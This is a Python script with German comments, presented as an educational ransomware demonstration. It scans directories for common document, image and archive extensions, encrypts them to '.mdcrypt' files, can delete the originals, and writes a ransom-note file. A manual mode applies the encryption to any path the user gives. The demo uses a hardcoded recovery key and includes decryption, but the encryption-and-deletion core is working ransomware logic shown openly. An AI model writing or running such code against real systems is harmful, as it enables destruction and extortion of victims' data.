#!/usr/bin/env python3
"""
EDUCATIONAL DEMONSTRATION: File Encryption/Decryption mit .mdcrypt
Purpose: Verstehen wie Ransomware technisch funktioniert (Defensive)
WARNING: Nur für Bildungszwecke. Nur auf Test-Dateien ausführen.
"""

import os
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class MdcryptCrypto:
    """
    Demonstration der symmetrischen Dateiverschlüsselung.
    Verwendet ein generisches Passwort für Ver- und Entschlüsselung.
    """
    
    # Generischer Schlüssel für diese Demo (in echter Ransomware: zufällig generiert)
    DEFAULT_PASSWORD = "MDCRYPT_DEMO_KEY_2024"
    
    def __init__(self, password: str = None, salt: bytes = None):
        """Initialisierung mit passwortbasierter Schlüsselableitung."""
        self.password = password or self.DEFAULT_PASSWORD
        if salt is None:
            salt = os.urandom(16)
        self.salt = salt
        self.key = self._derive_key(self.password)
        self.cipher = Fernet(self.key)
    
    def _derive_key(self, password: str) -> bytes:
        """Leitet einen sicheren Schlüssel aus dem Passwort ab (PBKDF2)."""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=480000,
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
    
    def encrypt_file(self, filepath: str, delete_original: bool = False) -> bool:
        """
        Verschlüsselt eine einzelne Datei mit .mdcrypt Endung.
        
        Args:
            filepath: Pfad zur Datei
            delete_original: Löscht Original nach Verschlüsselung (Simulation)
        """
        try:
            # Original-Datei lesen
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Daten verschlüsseln
            encrypted = self.cipher.encrypt(data)
            
            # Verschlüsselte Datei schreiben (.mdcrypt Endung)
            encrypted_path = filepath + '.mdcrypt'
            with open(encrypted_path, 'wb') as f:
                # Salt + Passwort-Hash (für spätere Entschlüsselung) + verschlüsselte Daten
                # Speichere auch Passwort-Hash um zu verifizieren
                password_hash = hash(self.password) & 0xFFFFFFFF
                header = f"{self.salt.hex()}|{password_hash}\n".encode()
                f.write(header + encrypted)
            
            print(f"[+] Verschlüsselt: {filepath}")
            print(f"    -> {encrypted_path}")
            
            # Optional: Original löschen (Ransomware-Verhalten simulieren)
            if delete_original:
                os.remove(filepath)
                print(f"    [~] Original gelöscht: {filepath}")
            
            return True
            
        except Exception as e:
            print(f"[-] Fehler bei Verschlüsselung {filepath}: {e}")
            return False
    
    def decrypt_file(self, encrypted_path: str, password: str = None) -> bool:
        """
        Entschlüsselt eine .mdcrypt Datei.
        
        Args:
            encrypted_path: Pfad zur .mdcrypt Datei
            password: Passwort für Entschlüsselung (default: generischer Key)
        """
        try:
            if password is None:
                password = self.DEFAULT_PASSWORD
            
            with open(encrypted_path, 'rb') as f:
                content = f.read()
            
            # Header parsen (Salt|PasswordHash)
            header_end = content.find(b'\n')
            header = content[:header_end].decode()
            salt_hex, _ = header.split('|')
            encrypted_data = content[header_end + 1:]
            
            # Mit gespeichertem Salt neu initialisieren
            stored_salt = bytes.fromhex(salt_hex)
            temp_crypto = MdcryptCrypto(password=password, salt=stored_salt)
            
            # Entschlüsseln
            decrypted = temp_crypto.cipher.decrypt(encrypted_data)
            
            # Original-Dateiname wiederherstellen
            if encrypted_path.endswith('.mdcrypt'):
                output_path = encrypted_path[:-8]  # Entfernt .mdcrypt
            else:
                output_path = encrypted_path + '.decrypted'
            
            with open(output_path, 'wb') as f:
                f.write(decrypted)
            
            print(f"[+] Entschlüsselt: {encrypted_path}")
            print(f"    -> {output_path}")
            return True
            
        except Exception as e:
            print(f"[-] Fehler bei Entschlüsselung {encrypted_path}: {e}")
            print(f"    Mögliche Ursachen: Falsches Passwort oder beschädigte Datei")
            return False
    
    def scan_and_encrypt(self, directory: str, extensions: list = None, 
                        delete_original: bool = False) -> int:
        """
        Scannt Verzeichnis und verschlüsselt gefundene Dateien.
        (Simuliert Ransomware-Verhalten auf kontrollierte Weise)
        """
        encrypted_count = 0
        
        if extensions is None:
            # Standard-Zielformate wie echte Ransomware
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', 
                         '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar']
        
        print(f"\n[*] Scanne: {directory}")
        print(f"[*] Ziel-Formate: {', '.join(extensions)}")
        
        for root, dirs, files in os.walk(directory):
            for filename in files:
                # Überspringe bereits verschlüsselte Dateien
                if filename.endswith('.mdcrypt'):
                    continue
                    
                filepath = os.path.join(root, filename)
                file_ext = os.path.splitext(filename)[1].lower()
                
                if file_ext in extensions:
                    if self.encrypt_file(filepath, delete_original):
                        encrypted_count += 1
        
        return encrypted_count
    
    def scan_and_decrypt(self, directory: str, password: str = None) -> int:
        """Scannt Verzeichnis und entschlüsselt alle .mdcrypt Dateien."""
        decrypted_count = 0
        
        if password is None:
            password = self.DEFAULT_PASSWORD
        
        print(f"\n[*] Suche nach .mdcrypt Dateien in: {directory}")
        
        for root, dirs, files in os.walk(directory):
            for filename in files:
                if filename.endswith('.mdcrypt'):
                    filepath = os.path.join(root, filename)
                    if self.decrypt_file(filepath, password):
                        decrypted_count += 1
        
        return decrypted_count


def create_ransom_note(directory: str):
    """Erstellt eine simulierte Lösegeldforderung (nur zu Demonstrationszwecken)."""
    note_path = os.path.join(directory, 'MDCRYPT_README.txt')
    note_content = """
╔══════════════════════════════════════════════════════════════════╗
║                     MDCRYPT DEMONSTRATION                        ║
╠══════════════════════════════════════════════════════════════════╣
                                                                  ║
  ACHTUNG: Dies ist eine EDUKATIVE Simulation!                    ║
                                                                  ║
  Ihre Dateien wurden mit MDCRYPT verschlüsselt.                  ║
                                                                  ║
  In echter Ransomware würde hier stehen:                         ║
  - Zahlungsanweisungen in Bitcoin/Monero                         ║
  - Drohungen mit Datenveröffentlichung                           ║
  - Zeitlimits für Zahlung                                        ║
                                                                  ║
  GENERISCHER ENTSCHLÜSSELUNGS-KEY:                               ║
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                               ║
  Passwort: MDCRYPT_DEMO_KEY_2024                                 ║
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                               ║
                                                                  ║
  Um zu entschlüsseln:                                            ║
  python3 mdcrypt_demo.py --decrypt <verzeichnis>                 ║
                                                                  ║
  ODER:                                                           ║
  - Datei in das Tool laden                                       ║
  - Passwort eingeben: MDCRYPT_DEMO_KEY_2024                       ║
  - Entschlüsseln                                                  ║
                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""
    with open(note_path, 'w', encoding='utf-8') as f:
        f.write(note_content)
    print(f"[+] Demo-Lösegeldnachricht erstellt: {note_path}")


def demo_mode():
    """Interaktive Demo mit Test-Dateien."""
    test_dir = './mdcrypt_demo'
    
    print("=" * 70)
    print("  MDCRYPT DEMONSTRATION - Bildungszwecke nur")
    print("=" * 70)
    
    # Test-Verzeichnis erstellen
    os.makedirs(test_dir, exist_ok=True)
    
    # Beispiel-Dateien erstellen
    print("\n[1] Erstelle Test-Dateien...")
    test_files = {
        'wichtig_dokument.txt': 'Dies ist ein wichtiges Dokument mit sensiblen Daten.',
        'finanzen_2024.xlsx': 'Konto,Saldo\n12345,15000.00\n67890,8500.00',
        'familienfoto.jpg': b'FAKE_IMAGE_DATA_WOULD_BE_HERE',
        'praesentation.pptx': 'Präsentationsinhalt...',
    }
    
    for filename, content in test_files.items():
        filepath = os.path.join(test_dir, filename)
        mode = 'wb' if isinstance(content, bytes) else 'w'
        with open(filepath, mode) as f:
            f.write(content)
        print(f"    [+] {filename}")
    
    # Verschlüsselung
    print("\n[2] Initialisiere Verschlüsselung...")
    crypto = MdcryptCrypto()
    print(f"    Generischer Key: {crypto.DEFAULT_PASSWORD}")
    
    print("\n[3] Verschlüssele Dateien...")
    count = crypto.scan_and_encrypt(test_dir, delete_original=True)
    print(f"\n    {count} Dateien verschlüsselt (.mdcrypt)")
    
    # Lösegeldnachricht
    create_ransom_note(test_dir)
    
    # Zeige verschlüsselte Dateien
    print("\n[4] Verschlüsselte Dateien:")
    for f in os.listdir(test_dir):
        if f.endswith('.mdcrypt'):
            print(f"    🔒 {f}")
    
    # Entschlüsselung
    print("\n[5] Entschlüssele mit generischem Key...")
    decrypted = crypto.scan_and_decrypt(test_dir)
    print(f"\n    {decrypted} Dateien entschlüsselt")
    
    print("\n" + "=" * 70)
    print("  Demo abgeschlossen. Prüfe:", test_dir)
    print("=" * 70)


def manual_mode():
    """Manueller Modus für eigene Dateien."""
    print("=" * 70)
    print("  MDCRYPT MANUELLER MODUS")
    print("=" * 70)
    
    print("\nOptionen:")
    print("1. Datei/Verzeichnis verschlüsseln")
    print("2. .mdcrypt Datei entschlüsseln")
    print("3. Verzeichnis scannen und alle entschlüsseln")
    
    choice = input("\nWähle (1-3): ").strip()
    
    if choice == "1":
        path = input("Pfad zur Datei oder Verzeichnis: ").strip()
        if os.path.exists(path):
            crypto = MdcryptCrypto()
            if os.path.isfile(path):
                crypto.encrypt_file(path)
            else:
                count = crypto.scan_and_encrypt(path)
                print(f"\n{count} Dateien verschlüsselt")
        else:
            print("Pfad nicht gefunden!")
    
    elif choice == "2":
        path = input("Pfad zur .mdcrypt Datei: ").strip()
        pwd = getpass.getpass("Passwort (Enter für generischen Key): ").strip()
        if not pwd:
            pwd = None
        
        crypto = MdcryptCrypto()
        crypto.decrypt_file(path, password=pwd)
    
    elif choice == "3":
        path = input("Verzeichnis: ").strip()
        pwd = getpass.getpass("Passwort (Enter für generischen Key): ").strip()
        if not pwd:
            pwd = None
            
        crypto = MdcryptCrypto()
        count = crypto.scan_and_decrypt(path, password=pwd)
        print(f"\n{count} Dateien entschlüsselt")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "--demo":
            confirm = input("Dies erstellt Test-Dateien und verschlüsselt sie. Fortfahren? (ja/nein): ")
            if confirm.lower() in ['ja', 'yes', 'j', 'y']:
                demo_mode()
        elif sys.argv[1] == "--decrypt" and len(sys.argv) > 2:
            # Schnelle Entschlüsselung: python script.py --decrypt /pfad/zu/dateien
            crypto = MdcryptCrypto()
            crypto.scan_and_decrypt(sys.argv[2])
        else:
            print("Verwendung:")
            print("  python3 mdcrypt_demo.py --demo       # Interaktive Demo")
            print("  python3 mdcrypt_demo.py --decrypt /pfad  # Schnelles Entschlüsseln")
    else:
        manual_mode()
